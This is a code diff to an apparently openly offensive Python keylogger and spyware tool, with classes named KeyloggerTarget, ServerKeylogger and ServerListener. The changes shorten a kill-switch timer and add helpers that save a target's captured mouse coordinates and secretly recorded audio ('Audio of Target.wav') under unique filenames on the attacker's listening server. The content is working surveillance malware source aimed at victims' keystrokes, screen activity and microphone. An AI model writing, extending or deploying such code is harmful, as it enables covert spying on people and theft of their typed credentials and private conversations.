@@ -4,9 +4,7 @@ import time
 import sys
 import socket
 import pyautogui as pg
-import subprocess
 import os
-import math
 import pyaudio
 import wave
 import threading
@@ -174,7 +172,7 @@ class KeyloggerTarget:
 
     def kill_switch(self):
         #This function destroys the mouse info
-        new_seconds = self.duration + 20
+        new_seconds = self.duration + 5
         # 20 seconds are being added because there might be a problem
         for x in range(new_seconds):
             time.sleep(1)
@@ -242,6 +240,7 @@ class ServerKeylogger:
         self.port = port
 
     def message(self, real_data):
+        global new_data
         # To know if the server has some issues
         for zeichen in real_data:
             if "{" == zeichen:
@@ -258,6 +257,17 @@ class ServerKeylogger:
 
         else:
             bp.color("The Target didn't type something...", "magenta")
+
+    def check_double(self):
+        dir = os.listdir()
+        check = [each_name for each_name in dir if "mouseInfo" in each_name]
+        if len(check) == 0:
+            filename = "mouseInfoLog.txt"
+        else:
+            amount = len(check) + 1
+            filename = f"mouseInfoLog {amount}.txt"
+
+        return filename
 
     def start(self):
         try:
@@ -280,7 +290,10 @@ class ServerKeylogger:
                 #Checks if the coordinates are there
                 cord = full_msg.split(")]")
                 new_cor = cord[0] + ")]"
-                with open("mouseInfoLog.txt", "a+") as file:
+                direct = os.listdir()
+
+                filename = self.check_double()
+                with open(filename, "a+") as file:
                     #The coordinates will be stored in "mouseInfoLog.txt"
                     file.write(f"These are the coordinates of the target \n{new_cor}")
                 bp.color("The coordinates of the target have been saved to your directory", "magenta")
@@ -392,8 +405,19 @@ class ServerListener:
         self.ip = ip
         self.port = port
 
+    def check_double(self):
+        dir = os.listdir()
+        check = [each_name for each_name in dir if "Audio of Target" in each_name]
+        if len(check) == 0:
+            filename = "Audio of Target.wav"
+        else:
+            amount = len(check) + 1
+            filename = f"Audio of Target {amount}.wav"
+
+        return filename
+
     def start(self):
-        global urgent
+        global filename
         try:
             listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             listening_data.bind((self.ip, self.port))
@@ -414,13 +438,14 @@ class ServerListener:
 
             listening_data.close()
             frames = ast.literal_eval(full_msg)
-            data_file = wave.open("Audio of target.wav", "wb")
+            filename = self.check_double()
+            data_file = wave.open(filename, "wb")
             data_file.setnchannels(2)
             data_file.setsampwidth(2)
             data_file.setframerate(44100)
             data_file.writeframes(b''.join(frames))
             data_file.close()
-            bp.color('"Audio of target.wav" has been saved to your directory', "green")
+            bp.color(f'"{filename}" has been saved to your directory', "green")
 
             # This stores everything the target was talking
 
